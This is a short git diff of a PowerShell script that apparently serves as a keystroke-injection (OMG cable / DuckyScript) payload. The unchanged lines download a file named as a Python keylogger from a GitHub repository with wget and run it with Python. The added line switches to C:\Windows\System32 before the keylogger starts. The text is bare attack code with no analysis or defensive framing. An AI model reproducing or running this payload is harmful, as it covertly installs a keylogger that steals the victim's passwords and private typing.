@@ -9,4 +9,5 @@ invoke-expression 'cmd /c start powershell -Command { $env:Path = [System.Enviro
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
 wget "https://raw.githubusercontent.com/csandoval63/OMGCableStuff/master/Python%20keylogger%20stuff%20with%20DUCKYscript/python%20keylogger%20test.py" -outfile "pythonkl.py"
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
+cd C:\Windows\System32
 python pythonkl.py
